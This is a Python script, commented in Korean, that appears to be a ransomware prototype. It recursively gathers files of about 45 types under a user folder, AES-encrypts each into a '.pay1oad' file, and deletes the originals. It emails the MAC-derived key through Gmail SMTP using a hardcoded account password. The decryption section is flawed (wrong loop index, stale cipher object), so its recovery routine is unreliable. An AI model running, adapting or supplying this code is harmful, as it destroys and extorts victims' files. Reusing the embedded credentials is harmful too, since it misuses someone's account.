from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import uuid 
import hashlib
import os #암호화에 필요한 모듈 가져옴.
import smtplib
from email.mime.text import MIMEText    #메일을 보낼 때 메시지의 제목과 본문을 설정

#arr는 잠그기 위한 확장자 list
arr = ['.txt', '.doc', '.docx', '.hwp', '.pptx', '.ppt', '.xls', '.pdf', '.ai', '.psd', '.tx', '.bmp', '.gif', '.png', '.jpg', '.jpeg', '.raw', '.tiff', '.was', '.wma', '.mp3', '.mp4', '.mkv', '.avi', '.flv', '.mov', '.7z', '.aip', '.alz', '.egg', '.zip', '.py', '.c', '.cpp', '.java', '.class', '.html', '.ini', '.lnk', '.exe', '.ttf', '.sys', '.dat', '.jar', '.md']
forChange = [] #확장자들의 요소들만을 가지고 있음.
linkForChange = [] #확장자들이 존재하는 링크list
link = 'C:\\Users\\tlatm\\OneDrive\\바탕 화면\\test' #심승민 컴퓨터 기준 test폴더 안 파일들
file_list = os.listdir(link) # link 경로에 있는 모든 파일들을 file_list로 저장.


def isFile(llist, llink): 
    noChange = [] #폴더 파일
    global forChange 
    global linkForChange
    ffile_list = llist #
    global link
    
    #현재 전체 파일list에서 확장자가 존재하는지를 확인하기 위한 이중 for문
    for i in range(0, len(ffile_list)): 
        for j in range(0, len(arr)): 
            if ffile_list[i].find(arr[j]) >= 0: #파일 이름이 다음 확장자를 내포하고있다면,
                linkForChange.append(llink + '\\' + ffile_list[i]) #경로와 확장자를 합쳐서 저장.
                forChange.append(ffile_list[i]) #파일 추가.
                
    #전체 파일 list랑 폴더list랑 확장자 list를 집합화 하여 중복을 제거함.  
    ffile_list_set = set(ffile_list) 
    forChange_set = set(forChange)
    noChange_set = set(noChange)

    noChange_set = ffile_list_set - forChange_set #전체 파일에서 확장자set를 빼주면, 폴더set이 나옴.
    noChange = list(noChange_set)
    if not len(noChange): # 더이상 폴더파일 이 존재하지않을 경우에 종료.
        return
    else:
        for i in range(0, len(noChange)):
            tempLink = link #임의 변수에 link의 경로를 미리 복사해놓음
            link += '\\' + noChange[i] #이부분이 사실상 최종 경로.
            ffile_list = os.listdir(link) 
            isFile(ffile_list, link) 
            link = tempLink #위에 부분이 끝나고 남아있는정보를 reset하기 위함.
            
            

isFile(file_list, link)

linkForChange_set = set(linkForChange)
linkForChange = list(linkForChange_set) #list에서 겹치는 파일을 제거
print(linkForChange) 
'''
for i in range(0, len(linkForChange)):
    Encryption(linkForChange[i])
    '''

Block_Size = 256
chunksize = 256*1024
#

extension = [] #확장자 list
file_name = [] #파일 이름 list
#list의 index에 맞게 이름과 확장자 분리하여 저장 - 나중에 복호화 시 사용하기 위함

print("**암호화**")
print(hex(uuid.getnode()).encode('utf8')) #나중에 삭제!!! 테스트하기 쉬우라고 화면에 복호화 키 출력
original_password = hex(uuid.getnode()).encode('utf8')  #mac address를 받아 16진수로 변환하여 암호로 사용

smtp = smtplib.SMTP('smtp.gmail.com', 587)
smtp.starttls()  # TLS 사용시 필요
smtp.login('pythonransomware@gmail.com', 'bnzrajjwqrzllgvf') #복호화 키를 보낼 이메일 등록 - 주소, 비밀번호

msg = MIMEText(hex(uuid.getnode())) #복호화 키
msg['Subject'] = '테스트'  
smtp.sendmail('pythonransomware@gmail.com', 'tlatmdals01@gmail.com', msg.as_string()) #복호화 키를 보낼 이메일, 복호화 키를 받을 이메일

smtp.quit()

# AES암호화를 위해서는 32바이트 key가 필요하다. hashlib을 이용하여 사용자 암호를 32바이트 key로 변환한다.
key = hashlib.pbkdf2_hmac(hash_name='sha256', password=original_password, salt=b'$3kj##agh_', iterations=100000)
#암호화 키를 생성함.
#암호화할 비밀도 encode("utf8")을 이용 bytes로 변환한다.
# text = input("암호화 하고자 하는 비밀: ").encode("utf8")

for k in range(0, len(linkForChange)):

    fileFullname = linkForChange[k] 
    filename, FileExtension = os.path.splitext(linkForChange[k]) #파일의 이름과 확장자를 분리하여 각각 변수에 

    extension.append(FileExtension) #확장자를 list에 추가
    file_name.append(filename) #파일 이름을 list에 추가

    #복원할 때, 원래 파일의 크기가 필요하다. 다음과 같이 파일 사이즈를 얻은 후, 16byte로 만든다.
    filesize = str(os.path.getsize(fileFullname)).zfill(16)

    #암호화를 위해서 다음과 같이 AES 개체를 만든다. 복호화 할때에도 동일한 AES개체를 만들면 된다.
    mode = AES.MODE_ECB
    aes = AES.new(key, mode)

    #파일을 불러 들인다. 동영상과 같은 대용량 파일의 경우, 한번에 불러들이면 에러가 난다.
    #이를 방지하기 위해서 일정한 크기(위의 chunksize)로 나누어 불러들이고, 여러차례 암호화를 실시

    #파일 암호화 파트
    with open(fileFullname, 'rb') as infile: #바이트 모드로 읽기 test.txt
        with open(filename + ".pay1oad", 'wb') as outfile: #바이트 모드로 쓰기 test.pay1oad
            outfile.write(filesize.encode('utf-8'))
            while True:
                chunk = infile.read(chunksize)
            #모든 파일을 불러들었으면, 반복문을 나가서 다음으로 넘어간다.
                if len(chunk) == 0:
                    break
            #마지막에 16바이트가 안될 경우에는 _을 삽입하여 16바이트로 만들어주어야 에러가 나지 않는다.
                elif len(chunk) % 16 != 0:
                    chunk += b'_' * (256 - (len(chunk) % 256))
            #다음과 같이 암호화된 부분을 새로운 파일에 입력한다.
                outfile.write(aes.encrypt(chunk))
    os.remove(fileFullname)



print("**복호화**")
original_password = input("password: ").encode('utf8')
#복호화를 위하여 AES 객체를 만든다. 사실 암호화과정에서 만든 AES 객체를 다시 이용해도 무방 \
key = hashlib.pbkdf2_hmac(hash_name='sha256', password=original_password, salt=b'$3kj##agh_', iterations=100000)
#복호화할 파일을 지정한다.

for l in range(0, len(linkForChange)):
    filename = os.path.splitext(linkForChange[k])[0]

    #파일을 불러들이다. 동영상과 같은 대용량 파일의 경우, 한번에 불러들이면 에러가 난다.
    #이를 방지하기 위해서 일정한 크기(위의 chunksize)로 나누어 불러들이고, 여러차례 암호화를 실시

    fileFullname = file_name[l] + '.pay1oad' #.pay1oad로 바뀐 확장자에 맞춰서 이름 변경

    #파일 복호화 파트
    with open(fileFullname, 'rb') as infile:
        filesize = int(infile.read(16))
    #복호화된 파일을 저장할 파일을 만든다.
        with open(file_name[l] + extension[l], 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
    #복호화된 내용을 새로운 파일에 삽입한다.
                outfile.write(aes.decrypt(chunk))
    #원래의 파일사이즈를 넘는 부분은 암호화과정에서 16byte로 만들기 위해서 _를 삽입한 부분이다.
    #다음과 같이 truncate명령어를 써서 원래의 파일사이즈를 넘는 부분은 제거해 버린다.
            outfile.truncate(filesize)
    os.remove(fileFullname) #.payload 확장자 파일 삭제


print("복호화 완료")
